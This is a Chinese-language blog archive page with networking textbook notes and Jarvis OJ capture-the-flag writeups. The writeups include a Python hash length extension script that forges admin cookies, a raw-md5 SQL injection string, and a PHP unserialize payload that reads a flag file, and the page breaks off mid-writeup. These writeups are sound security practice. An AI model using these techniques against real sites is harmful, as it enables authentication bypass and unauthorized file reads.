<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-《计算机网络-自顶向下方法》学习笔记-第1章" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/14/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0/" class="article-date">
  <time class="dt-published" datetime="2020-01-14T02:04:21.000Z" itemprop="datePublished">2020-01-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/14/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0/">《计算机网络-自顶向下方法》学习笔记--第1章</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="第1章-《计算机网络与因特网》"><a href="#第1章-《计算机网络与因特网》" class="headerlink" title="第1章 《计算机网络与因特网》"></a>第1章 《计算机网络与因特网》</h2><h3 id="1-1-什么是因特网"><a href="#1-1-什么是因特网" class="headerlink" title="1.1 什么是因特网"></a>1.1 什么是因特网</h3><p>因特网中所有连接的设备被称作<strong>主机</strong>或<strong>端系统</strong>。其中端系统通过<strong>通信链路</strong>和<strong>分组交换机</strong>相连。通信链路由许多不同的物理媒介构成，如<strong>同轴电缆，铜缆，光纤与无线电频谱</strong>等。分组交换机中最著名的是<strong>路由器</strong>与<strong>链路层交换机</strong>。链路层交换机通常用于接入网中（接入网见1.2节），而路由器通常用于网络核心中。端系统通过<strong>因特网服务提供商</strong>（ISP，见1.3节）接入因特网，ISP同样进行互联。</p>
<p><strong>协议</strong>控制着因特网中信息的接收和发送，<strong>TCP</strong>（传输控制协议）与<strong>IP</strong>（网际协议）是因特网中最重要的两个协议。因特网标准由<strong>IETF</strong>（因特网工程任务组）负责研发，IETF的标准文档被称为<strong>RFC</strong>（Request For Comment，请求评论）。<strong>协议定义了在两个或多个通信实体之间交换报文的格式和顺序，以及报文发送和接收的一条报文或其他时间所采取的动作。</strong></p>
<h3 id="1-2-网络边缘"><a href="#1-2-网络边缘" class="headerlink" title="1.2 网络边缘"></a>1.2 网络边缘</h3><p>主机和端系统经常被划分成两部分：客户和服务器。</p>
<p><strong>接入网指将端系统物理连接到其边缘路由器的网络</strong>。<strong>边缘路由器是指端系统到任何其它远程端系统的路径上的第一台路由器</strong>。家庭接入网有两种最常见的形式：<strong>DSL（数字用户线）和电缆</strong>。</p>
<p>DSL利用电话公司<strong>现有的本地电话基础设施</strong>。住户通常从本地电话公司获得DSL因特网接入，<strong>本地电话公司是ISP</strong>。其中每个用户的<strong>DSL调制解调器</strong>使用现有的电话线与位于电话公司的<strong>本地中心局（CO）</strong>中的<strong>数字电话线接入复用器（DSLAM）</strong>交换数据。调制解调器将数字数据转换为高频音传输给本地中心局，来自家庭的模拟信号在DSLAM转换回数字形式。家庭电话线使用<strong>频分复用</strong>技术分隔数据与电话信号。</p>
<p>电缆互联网接入利用有线电视公司现有的电视基础设施。在该系统中应用了光纤和同轴电缆，因此常被称为<strong>混合光纤铜缆（HFC）系统</strong>，因为其使用光缆将电缆头端连接到地区枢纽，再从这里使用传统同轴电缆到达住宅。电缆因特网接入需要使用电缆调制解调器。在电缆头端的<strong>电缆调制解调器端接系统（CMTS）</strong>与DSL网络中的DSLAM具有类似的功能。与DSL类似，电缆接入网的速率是不对称的，下行信道的传输速率通常比上行的信道高。电缆因特网接入是<strong>共享广播媒体</strong>的，即上下行信道总带宽都是共享的。</p>
<p><strong>光纤到户（FTTH）</strong>是一种能提供更高速率的新兴技术。光纤分布有几种方案，最简单的一种称为<strong>直接光纤</strong>，即从本地中心局到每户设置一根光纤。进行这种分配有两种有光纤分布体系结构，即<strong>主动光纤网络（AON）</strong>与<strong>被动光纤网路（PON）</strong>。其中AON的本质为交换因特网，而使用PON网络的结构中，每个家庭具有一个<strong>光纤网络端接器（ONT）</strong>，其使用专门的光纤连接到邻接的<strong>分配器</strong>，分配器把一些家庭集中到一根共享的光纤，再连接到本地电话公司和公司中心局的<strong>光纤线路端接器（OLT）</strong>，OLT提供了光信号与电信号之间的转换，再经由本地电话公司路由器与因特网相连。家庭中与ONT相连的通常是无线路由器。所有从OLT发送到分配器的分组由分配器复制。</p>
<p>物理媒体分为<strong>导引型媒体</strong>与<strong>非导引型媒体</strong>。对于导引型媒体，电波沿着固体媒介前行，如光缆，铜缆，双绞电缆等；对于非导引型媒体，电波在空气或外层空间传播，如无线广域网或数字卫星频道。</p>
<p><strong>双绞铜线</strong>为最便宜和最常用的导引型传输媒体。其中两根铜线被绞起来以减少电磁干扰。无屏蔽双绞线常用在建筑物内的计算机网络中，即局域网。其传输速率取决于线的粗细和传输方和接收方之间的距离。<strong>同轴电缆</strong>由两个同心铜导体组成，能被用于导引型共享媒体，在电缆电视中相当普遍。<strong>光纤</strong>是一种细而柔软的，能够引导光脉冲的媒体，不受电磁干扰且很难窃听，常作为长途导引型传输媒体。<strong>无线电信道</strong>存在电磁频谱中的信号，极大依赖于传播环境和信号传输的距离。<strong>卫星无线电频道通信</strong>常用同步卫星与近地轨道卫星两种。</p>
<h3 id="1-3-网络核心"><a href="#1-3-网络核心" class="headerlink" title="1.3 网络核心"></a>1.3 网络核心</h3><p>通过网络链路和交换机移动数据有两种基本方法：<strong>电路交换</strong>与<strong>分组交换</strong>。</p>
<h4 id="1-3-1分组交换"><a href="#1-3-1分组交换" class="headerlink" title="1.3.1分组交换"></a>1.3.1分组交换</h4><p>在分组交换中，源将长报文划分为较小的数据块，即<strong>分组</strong>。在源与目的之间，分组通过通信链路和分组交换机（分组交换机包括<strong>路由器</strong>与<strong>链路层交换机</strong>）进行传送，分组以该链路的最大传输速率通过通信链路。多数分组交换机使用<strong>存储转发传输机制</strong>（store-and-forward transmission），即在交换机能够向输出链路参数该分组的第一个比特前，<strong>必须接收到分组的全部内容</strong>。忽略传播时延，可得到通过N条速率为R的链路组成的路径（即路径中有N-1个路由器），从源向目的地发送一个分组，可得到端到端时延为</p>
<p>[latex display=’true’]d_{端到端}=N\frac{L}{R}[/latex]</p>
<p>对于每一个相连的链路，分组交换机都具有一个<strong>输出缓存</strong>，也即<strong>输出队列</strong>，用于存储路由器准备发往该链路的分组。这就造成了分组的<strong>排队时延</strong>，排队时延取决于<strong>网络的拥塞程度</strong>。由于输出缓存的容量是有限的，一个到达的分组可能发现缓存已经被占满，这样就可能出现<strong>丢包</strong>现象，即到达的分组被丢弃。</p>
<p>每个路由器具有一个<strong>转发表</strong>，用于<strong>将目的地址映射为输出链路</strong>。当一个分组到达一台路由器时，路由器检查分组目的地址，并用该地址搜索转发表，以找到对应的转发链路，随后将分组发向该链路。</p>
<h4 id="1-3-2-电路交换"><a href="#1-3-2-电路交换" class="headerlink" title="1.3.2 电路交换"></a>1.3.2 电路交换</h4><p>在电路交换网络中，端系统间通信会话期间<strong>预留了端系统间沿路径通信所需要的资源</strong>，如缓存和传输速率等。而相对应的，分组交换网络则不进行预留，会话按需使用资源。当两台主机需要通信时，网络在两台主机间建立专用的端到端连接，在该链路上预留了<strong>恒定的传输速率</strong>。</p>
<p>链路中的电路是通过<strong>频分复用（FDM）</strong>或<strong>时分复用（TDM）</strong>技术实现的。对于FDM，链路的频谱由所有链接共享，在连接期间链路为<strong>每个连接专用一个频段</strong>，频段的宽度称为<strong>带宽</strong>。而对于TDM，<strong>时间被划分为固定长度的帧</strong>，而<strong>每个帧又被划分为固定数量的时隙</strong>，网络为每个连接指定一个时隙，这些<strong>时隙由这个连接单独使用</strong>，该时隙可用于传递该连接的数据。对于TDM，<strong>一条电路的传输速率等于帧速率乘以一个时隙中传输的的比特速率</strong>。</p>
<p>分组交换网络相对于电路交换网络，它提供了<strong>更好的带宽共享</strong>，比电路交换<strong>更简单，更有效，实现成本更低</strong>。</p>
<h4 id="1-3-3-网络的网络"><a href="#1-3-3-网络的网络" class="headerlink" title="1.3.3 网络的网络"></a>1.3.3 网络的网络</h4><p>ISP中同样存在大量互联。第一层ISP为最高层的ISP，区域ISP与第一层ISP相连，如谷歌这样的内容提供商网络也作为与第一层ISP同层次的网络。接入ISP与区域ISP相连，相同层的临近ISP是对等的。</p>
<h3 id="1-4-分组交换网中的时延，丢包和吞吐量"><a href="#1-4-分组交换网中的时延，丢包和吞吐量" class="headerlink" title="1.4 分组交换网中的时延，丢包和吞吐量"></a>1.4 分组交换网中的时延，丢包和吞吐量</h3><p>在所有时延中最为重要的有四个：<strong>节点处理时延，排队时延，传输时延和传播时延</strong>，这些时延之和为<strong>节点总时延</strong>。检查分组首部和决定将该分组往哪条链路发送时<strong>处理时延</strong>的一部分，此外还有检查比特级差错所需的时间等。<strong>排队时延</strong>为分组在队列中等待传输的时间，一个特定分组的排队时延取决于先期到达的正在排队等待向链路传输的分组数量。<strong>传输时延</strong>是将分组的所有比特推向链路所需的时间，若分组长度为L比特，路由器A到路由器B的传输速率为R bps，则传输时延为L/R。<strong>传播时延</strong>指从该链路的起点传播到下一个路由器所需的时间，该速率取决于链路的物理媒介。</p>
<p>需要注意的是，传输时延是路由器推出分组所需的时间，它是<strong>分组长度与链路传输速率的函数</strong>，与两台路由器之间的距离无关。传播时延是一个比特从一台路由器到另一台路由器所需的时间，是<strong>两台路由器之间距离的函数</strong>，与分组长度和链路传输速率无关。</p>
<p>设a为分组到达队列的平均速率，单位为pkt/s（分组每秒），R为传输速率，分组长度为L比特，则<strong>La/R被称作流量强度</strong>，若流量强度大于1，则比特到达队列的平均速率超过发送的速率，使得队列无限延长，排队时延趋于无穷大，因此<strong>设计时流量强度不能大于1</strong>。同样，分组丢失的比例也随着流量强度的增加而增加。</p>
<p>接收方主机在瞬间接收到文件的速率称为<strong>瞬时吞吐量</strong>。假设某文件由F比特组成，接受该文件使用了T秒，则传输的<strong>平均吞吐量</strong>为F/T bps。吞吐量是瓶颈链路的传输速率，即所有链路中<strong>传输速率的最小值</strong>。在现代因特网中对吞吐量的主要限制因素通常为接入网。当没有其它干扰流量时，吞吐量近似为沿着源和目的之间路径的最小传输速率。一般的，吞吐量不止取决于沿着链路的传输速率，还取决于干扰流量。</p>
<h3 id="1-5-协议层次及其服务模型"><a href="#1-5-协议层次及其服务模型" class="headerlink" title="1.5 协议层次及其服务模型"></a>1.5 协议层次及其服务模型</h3><p>网络设计者以<strong>分层</strong>的方式组织协议以及实现这些协议的网络硬件和软件。各层的所有协议被称为<strong>协议栈</strong>。因特网协议栈分为五层：<strong>应用层，传输层，网络层，链路层，物理层</strong>。<strong>应用层</strong>是网络应用程序及他们的应用层协议存留的地方，如HTTP，SMTP，FTP，位于该层的分组被称为<strong>报文（message）</strong>。<strong>传输层</strong>在应用程序端点之间传送应用层报文，由<strong>TCP与UDP</strong>两种传输协议提供。TCP提供了<strong>面向连接</strong>的服务，包括报文向目的的确保传递和流量控制，也将长报文划分为短报文，提供拥塞控制机制。UDP则提供<strong>无连接</strong>服务，它不提供不必要的服务，没有可靠性，流量控制与拥塞控制。传输层的分组称为<strong>段（segment）</strong>。<strong>网络层</strong>负责将分组从一台主机移动到另一台主机。网络层的分组称为<strong>数据报（datagram）</strong>。网络层包括IP，IP是唯一的，所有具有网络层的组件必须运行IP。此外还包括决定路由的路由选择协议，根据路由将数据包从源传输到目的地。<strong>链路层</strong>将分组从一个节点移动到路径上的下一个节点，链路层协议包括以太网，WiFi和电缆接入网的DOCSIS协议等。一个数据报可能被沿途不同链路上的不同协议所处理。链路层上的分组称为<strong>帧（frame）</strong>。<strong>物理层</strong>负责将帧中的一个个比特从上一个节点移动到下一个节点。</p>
<p>开放互联（OSI）模型分为七层：<strong>应用层，表示层，会话层，传输层，网络层，数据链路层，物理层</strong>。其中五层的功能与因特网协议栈大致相同。<strong>表示层</strong>的作用是使通信的应用程序能够解释交换数据的含义。<strong>会话层</strong>则提供了数据交换的定界与同步功能，包括建立检查点和恢复方案的方法。</p>
<p>链路层交换机实现了因特网协议栈中的第一层和第二层，路由器实现了第一层到第三层。在每一层，分组具有两种类型的字段：<strong>首部字段</strong>与<strong>有效载荷字段</strong>，有效载荷字段通常是来自上一层的分组。</p>
<h3 id="1-6-面向攻击的网络"><a href="#1-6-面向攻击的网络" class="headerlink" title="1.6 面向攻击的网络"></a>1.6 面向攻击的网络</h3><p><strong>病毒</strong>是一种需要某种形式的用户交互来感染用户设备的恶意文件。<strong>蠕虫</strong>是一种无需任何明显的用户交互就能进入设备的恶意软件。<strong>拒绝服务攻击（DoS）</strong>使得网络，主机或其它设施不能由合法用户使用。DoS大致分为以下几类：<strong>弱点攻击</strong>，指向目标发送精心组织的报文，如HTTP请求走私，HTTP参数毒化等；<strong>带宽泛洪</strong>，指向目标主机发送大量分组；<strong>连接泛洪</strong>，指向目标主机创建大量TCP连接。<strong>分布式DoS（DDoS）</strong>中，攻击者控制多个源并且让每个源都想目标发送大量流量。记录每个流经的分组副本的被动接收器被称为分组嗅探器，最好的防御嗅探的方法基本上都与密码学有关。将具有虚假源地址的分组注入因特网被称为IP欺骗，类似的还有ARP欺骗。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/01/14/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%AC%AC1%E7%AB%A0/" data-id="ckpw1c6un000ufww04mm49ahf" data-title="《计算机网络-自顶向下方法》学习笔记--第1章" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hash长度拓展攻击-jarvis-flag在管理员writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/22/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB-jarvis-flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98writeup/" class="article-date">
  <time class="dt-published" datetime="2019-11-21T16:54:25.000Z" itemprop="datePublished">2019-11-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/22/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB-jarvis-flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98writeup/">Hash长度拓展攻击——Jarvis Flag在管理员WriteUp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>本题需要使用到Hash长度拓展攻击，所以首先介绍一下这种攻击方法。</p>
<h2 id="Hash长度拓展攻击"><a href="#Hash长度拓展攻击" class="headerlink" title="Hash长度拓展攻击"></a>Hash长度拓展攻击</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>我们知道，某些哈希算法的加密是分组加密的形式，即将需要加密的文本分成等长的片段进行加密。而其中如sha1，md5等算法采取的方式是一种类似于CBC方式，即前一组的密文作为第二组的密钥输入。下面大致介绍sha1的加密过程：</p>
<h3 id="sha1加密过程"><a href="#sha1加密过程" class="headerlink" title="sha1加密过程"></a>sha1加密过程</h3><p><img src="https://image.3001.net/images/20150606/14335264155804.png"></p>
<p>在对明文进行分组时，sha1采用的方法是除最后一组外，每组64字节，最后一组为56字节，再加上8字节的长度描述符如构成。在最后一组字节数未满时，sha1除第一个字节填充hex(80)外，其余均填充hex(00)。如图所示，前一组生成的registers值作为下一组的输入使用，而初始registers值，即图中的registers值0为算法调用时产生的值，我们无法观测到。由哈希函数的特性我们可以知道，如果字符串分组与registers值给定，生成的hash值则是确定的。但是一般情况下，我们无法知道初始registers的值，也就无法在程序外计算得到值。此外，在进行哈希之前，程序通常会与一个salt值相拼接，也就保证了这里的哈希值不可伪造。</p>
<h3 id="拓展长度攻击"><a href="#拓展长度攻击" class="headerlink" title="拓展长度攻击"></a>拓展长度攻击</h3><p>但是，在拼接salt值时，如果采用的是salt在前，验证消息在后的形式，并且用户可以观察到hash值，就可能会造成拓展长度攻击。其原理大致如下：假设salt+验证消息的大小小于56字节，则算法会将其补至56字节，再填上长度描述符后进行哈希。设图中的”复杂数学运算”为二元函数f(register,text)，其中register为上一分组产生的密钥，text为输入的字符串。由上我们可得r1=f(r0,info1)，其中r0为初始register值，info1为已知字符串。如果没有第二个分组，r1便为最后的哈希值。如果我们能知道r1的值，在便能控制第二分组加密的register值，也就能预测得到的哈希值。也就是说，即使我们不知道salt的值，我们同样能够得到散列值。可参考文章： <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/69264.html">https://www.freebuf.com/articles/web/69264.html</a> 接下来我们通过Jarvis OJ的一道题进一步理解。</p>
<h2 id="Jarvis-OJ-flag在管理员手里"><a href="#Jarvis-OJ-flag在管理员手里" class="headerlink" title="Jarvis OJ-flag在管理员手里"></a>Jarvis OJ-flag在管理员手里</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>进入题目：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191121002158-1024x404.png"></p>
<p>需要作为admin登录，抓包查看：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191121004221.png"></p>
<p>观察到cookie中的可疑字段hsh和role，怀疑通过role字段判断身份，再通过hsh的哈希值验证。</p>
<p>又观察到该站点存在源码泄露，可下载得到index.php~，改后缀为swp后使用vim打开得到源码：</p>
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
        body {
                background:gray;
                text-align:center;
        }
</style>
</head>

<body>
        <?php
                $auth = false;
                $role = "guest";
                $salt =
                if (isset($\_COOKIE\["role"\])) {
                        $role = unserialize($\_COOKIE\["role"\]);
                        $hsh = $\_COOKIE\["hsh"\];
                        if ($role==="admin" && $hsh === md5($salt.strrev($\_COOKIE\["role"\]))) {
                                $auth = true;
                        } else {
                                $auth = false;
                        }
                } else {
                        $s = serialize($role);
                        setcookie('role',$s);
                        $hsh = md5($salt.strrev($s));
                        setcookie('hsh',$hsh);
                }
                if ($auth) {
                        echo "<h3>Welcome Admin. Your flag is
                } else {
                        echo "<h3>Only Admin can see the flag!!</h3>";
                }
        ?>

</body>
</html>

<p>可以看到这里将输入的role值进行反序列化 ，随后判断其反序列化后的值是否为admin，并且检测salt与翻转后role值拼接后的md5值是否与hsh值相同。于是我们可以利用哈希拓展长度攻击来使md5值符合要求，前一个要求则可通过%00截断完成。</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>这里我们使用了一个Python库HashPumpy，其主要用法如下：</p>
<p>库的使用说明：</p>
<blockquote>
<blockquote>
<blockquote>
<p>import hashpumpy<br>help(hashpumpy.hashpump)<br>Help on built-in function hashpump in module hashpumpy:<br>hashpump(…)<br>    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)<br>    Arguments:<br>        hexdigest(str):      Hex-encoded result of hashing key + original_data.<br>        original_data(str):  Known data used to get the hash result hexdigest.<br>        data_to_add(str):    Data to append<br>        key_length(int):     Length of unknown data prepended to the hash<br>    Returns:<br>        A tuple containing the new hex digest and the new message.</p>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>hashpumpy.hashpump(‘ffffffff’, ‘original_data’, ‘data_to_add’, len(‘KEYKEYKEY’))<br>return：(‘e3c4a05f’, ‘original_datadata_to_add’)</p>
</blockquote>
</blockquote>
</blockquote>
<p>由于我们不知道salt的长度，所以采取爆破的方式，编写脚本如下：</p>
<p>import hashpumpy<br>import requests<br>import urllib.parse</p>
<p>url = “<a href="http://web.jarvisoj.com:32778&quot;">http://web.jarvisoj.com:32778&quot;</a><br>hsh = “3a4727d57463f122833d9e732f94e4e0”<br>original_data = “;\“tseug\“:5:s”<br>appended_data = “;\“nimda\“:5:s”<br>r = requests.get(url)</p>
<p>for i in range(1,15):<br>    new_hash = hashpumpy.hashpump(hsh,original_data,appended_data,i)[0]<br>    digest = hashpumpy.hashpump(hsh,original_data,appended_data,i)[1]<br>    digest = urllib.parse.quote(digest[::-1])<br>    payload = {‘role’:digest,’hsh’:new_hash}<br>    print(payload)<br>    r = requests.get(url,cookies = payload)<br>    print(r.text)</p>
<p>运行得到flag。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>哈希拓展长度攻击是一种有效的伪造哈希签名的一种方式，但是其局限性很大，比如需要一些特定的哈希算法，salt值必须拼接在验证信息之前，salt不能发生改变，需要知道一段密文等等。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/22/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB-jarvis-flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98writeup/" data-id="ckpw1c6uc000dfww0bllf9l9z" data-title="Hash长度拓展攻击——Jarvis Flag在管理员WriteUp" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-jarvis-oj-writeup-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/06/jarvis-oj-writeup-web/" class="article-date">
  <time class="dt-published" datetime="2019-11-06T12:11:55.000Z" itemprop="datePublished">2019-11-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/06/jarvis-oj-writeup-web/">Jarvis OJ WriteUp Web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>本文介绍Jarvis OJ web方向上一些题目的解答，部分题目在其它文章中已经单独给出解答，这里只给出链接。</p>
<h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106193824.png"></p>
<p>进入链接，页面如上所示。要求本地登陆，尝试修改X-Forwarded-For字段：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106193946-1024x500.png"></p>
<p>得到flag</p>
<h2 id="LOGIN"><a href="#LOGIN" class="headerlink" title="LOGIN"></a>LOGIN</h2><p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106194226-1024x497.png"></p>
<p>进入发现需要密码进行登录，随意输入抓包得：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106194450.png"></p>
<p>注意到响应中的Hint字段给出了sql查询的构造语句。在这里通过学习发现字符串ffifdyop的md5散列值中含有可进行sql注入的字符，且后端代码中使用的md5函数的第二个参数为true，即输出为原始字符串，而非参数为false时的十六进制字符串。为了验证，我们给出php代码如下：</p>
<?php
    $word1 = md5(ffifdyop,true);
    $word2 = md5(ffifdyop,false);
    echo $word1;
    echo '<br>';
    echo $word2;
?>

<p>输出为</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106195234.png"></p>
<p>显然第一个输出的字符串可作为sql注入的payload，因此将pass设为该值并发送请求，得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106195355.png"></p>
<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>进入链接，只有一张图片：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106200021-1024x504.png"></p>
<p>只有一张图片，查看源代码：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106200150-1024x240.png"></p>
<p>注意到图片的来源和img参数，显然参数值是base64加密值，解码后为shield.php。尝试使img的值为showimg.php的base64加密，发现存在源码泄露，可以得到showimg.php的代码：</p>
<?php
$f = $\_GET\['img'\];
if (!empty($f)) {
$f = base64\_decode($f);
if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\\\')===FALSE
&& stripos($f,'pctf')===FALSE) {
readfile($f);
} else {
echo "File not found!";
}
}
?>

<p>对该程序进行测试和绕过花费了许多时间，但是没有找到可行的方法。后猜测是否存在别的源码文件，发现确实存在，使用与上面相同的方法可得到index.php的代码以及shield.php的代码：</p>
<?php 
require\_once('shield.php');
$x = new Shield();
isset($\_GET\['class'\]) && $g = $\_GET\['class'\];
if (!empty($g)) {
$x = unserialize($g);
}
echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>

<?php
//flag is in pctf.php
class Shield {
public $file;
function \_\_construct($filename = '') {
$this -> file = $filename;
}

function readfile() {
if (!empty($this->file) && stripos($this->file,'..')===FALSE  
&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {
return @file\_get\_contents($this->file);
}
}
}
?>

<p>到此目标已经十分明确，即通过反序列化读出pctf.php文件，故构造payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class&#x3D;O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag:</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106200916.png"></p>
<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>该题在 <a target="_blank" rel="noopener" href="http://106.54.80.67/index.php/2019/11/03/php%e4%b8%adsession%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/">http://106.54.80.67/index.php/2019/11/03/php%e4%b8%adsession%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/</a> 中已给出解答。</p>
<h2 id="ADMIN"><a href="#ADMIN" class="headerlink" title="ADMIN"></a>ADMIN</h2><p>进入页面啥也没有，抓包也一无所获：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203618-1024x499.png"></p>
<p>这时候一定要记得使用扫描器或者其它工具找找有无其它可读文件。使用扫描器得到有robots.txt</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203747.png"></p>
<p>进入该页面：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203829.png"></p>
<p>此为假flag，抓包查看：</p>
